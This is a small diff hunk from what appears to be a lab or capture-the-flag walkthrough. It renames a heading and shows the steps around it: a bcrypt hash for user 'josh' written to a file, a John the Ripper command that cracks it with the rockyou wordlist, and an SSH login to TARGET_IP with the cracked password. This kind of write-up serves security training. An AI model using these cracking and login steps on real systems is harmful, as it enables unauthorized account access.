@@ -162,7 +162,7 @@ echo 'josh:$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK' > josh.
 john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt josh.hash
 ```
 
-**3.8 — SSH in** (⚠ cracked password):
+### SSH in
 
 ```bash
 ssh josh@TARGET_IP
